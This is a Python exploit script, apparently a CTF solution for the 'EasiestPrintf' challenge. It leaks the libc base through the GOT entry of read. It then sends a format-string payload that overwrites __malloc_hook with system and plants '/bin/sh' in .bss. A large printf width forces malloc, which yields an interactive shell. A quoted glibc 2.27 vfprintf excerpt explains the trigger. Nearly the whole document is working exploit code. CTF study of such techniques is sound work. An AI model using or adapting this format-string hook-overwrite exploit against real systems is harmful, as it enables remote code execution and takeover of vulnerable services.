# File: exp.py
# Author: raycp
# Date: 2019-06-08
# Description: exp for EasiestPrintf, trigger malloc by printf

from pwn_debug import *


pdbg=pwn_debug("./EasiestPrintf")


pdbg.context.terminal=['tmux', 'splitw', '-h']

#pdbg.local()
pdbg.debug("2.27")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")

membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc

#io_file=IO_FILE_plus()
#io_file.show()


def pwn():
    
    pdbg.bp(0x804881C)
    p.recvuntil("read:\n")
    p.sendline(str(elf.got['read']))
    read_addr=int(p.recvuntil("\n")[:-1],16)
    libc_base=read_addr-libc.symbols['read']
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    system_addr=libc_base+libc.symbols['system']
    log.info("leak libc base: %s"%(hex(libc_base)))

    bss_addr=0x804A520

    # write system to malloc_hook and write "/bin/sh\x00" to bss_addr and trigger malloc by big output (code is shown as the bottom), malloc(bss_addr-0x20) to get shell.
    write_dict={malloc_hook:system_addr,bss_addr:u32('/bin'),bss_addr+4:u32("/sh\x00")}
    #payload=fmtstr_payload(7,write_dict,write_size="short")
    payload=pdbg.fmtstr_payload(7,write_dict,"short")
    payload+="%%%dc"%(bss_addr-0x20)
    p.recvuntil("Good Bye")
    log.info("fmt payload len: %s"%(hex(len(payload))))
    print repr(payload)
    p.sendline(payload)

    
    p.interactive() 

if __name__ == '__main__':
    pwn()



'''
        //source code to trigger free by printf
	// in function "printf_positional" which is located in /glibc-2.27/stdio-common/vfprintf.c 1971 

	/* Maybe the buffer is too small.  */
	if (MAX (prec, width) + EXTSIZ > WORK_BUFFER_SIZE)
	{
	  if (__libc_use_alloca ((MAX (prec, width) + EXTSIZ)
				 * sizeof (CHAR_T)))
	    workend = ((CHAR_T *) alloca ((MAX (prec, width) + EXTSIZ)
					  * sizeof (CHAR_T))
		       + (MAX (prec, width) + EXTSIZ));
	  else
	    {
	      workstart = (CHAR_T *) malloc ((MAX (prec, width) + EXTSIZ)
					     * sizeof (CHAR_T));
	      if (workstart == NULL)
		{
		  done = -1;
		  goto all_done;
		}
	      workend = workstart + (MAX (prec, width) + EXTSIZ);
	    }
	}
'''
